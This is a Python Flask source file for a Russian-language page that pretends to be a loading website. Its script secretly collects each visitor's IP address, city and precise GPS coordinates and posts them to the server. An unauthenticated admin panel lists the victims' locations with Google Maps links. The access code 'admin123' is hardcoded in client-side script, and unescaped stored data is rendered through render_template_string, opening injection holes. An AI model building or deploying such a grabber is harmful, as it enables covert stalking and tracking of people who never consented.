from flask import Flask, request, render_template_string
import json, uuid, os, sys
from datetime import datetime

app = Flask(__name__)
data_store = []

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head><title>Регистрация</title></head>
    <body style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
      <h2>Сайт загружается…</h2>
      <script>
      async function start() {
        try {
          const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
          navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const id = Math.random().toString(36).substring(2, 10);
            const payload = {
              id: id,
              timestamp: new Date().toISOString(),
              ip: ipData.ip,
              city: ipData.city,
              region: ipData.region,
              country: ipData.country_name,
              latitude: lat,
              longitude: lon,
              map_link: `https://www.google.com/maps?q=${lat},${lon}`
            };
            await fetch('/log', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(payload)
            });

            document.body.innerHTML = `
              <h2>Введите код доступа</h2>
              <form onsubmit="handleSubmit(event)">
                <input type="text" id="code" placeholder="Код" required style="padding:8px;font-size:16px;">
                <button type="submit" style="padding:8px 16px;font-size:16px;">Войти</button>
              </form>
              <script>
              function handleSubmit(e) {
                e.preventDefault();
                const code = document.getElementById('code').value;
                if (code === 'admin123') {
                  window.location.href = '/admin';
                } else {
                  window.location.href = '/loading';
                }
              }
              </script>
            `;
          });
        } catch (err) {
          document.body.innerHTML = "<h2>Ошибка при загрузке</h2>";
        }
      }
      start();
      </script>
    </body>
    </html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    data_store.append(data)
    return '', 204

@app.route('/loading')
def loading():
    return render_template_string("""
    <html><body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
    <h2>Сайт загружается…</h2>
    </body></html>
    """)

@app.route('/admin')
def admin():
    entries = ""
    for d in reversed(data_store):
        entries += f"""
        <div style="margin-bottom:20px;padding:10px;border:1px solid #ccc;">
          <strong>{d['timestamp']}</strong><br>
          IP: {d['ip']}<br>
          Город: {d['city']}, Регион: {d['region']}, Страна: {d['country']}<br>
          Координаты: {d['latitude']}, {d['longitude']}<br>
          <a href="{d['map_link']}" target="_blank">Открыть в Google Maps</a>
        </div>
        """
    return render_template_string(f"""
    <html><body>
    <h2>Админ-панель</h2>
    {entries}
    <form method="post" action="/restart">
      <button type="submit">🔁 Перезапустить</button>
    </form>
    </body></html>
    """)

@app.route('/restart', methods=['POST'])
def restart():
    os.execv(sys.executable, [sys.executable] + sys.argv)
    return "Перезапуск…"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
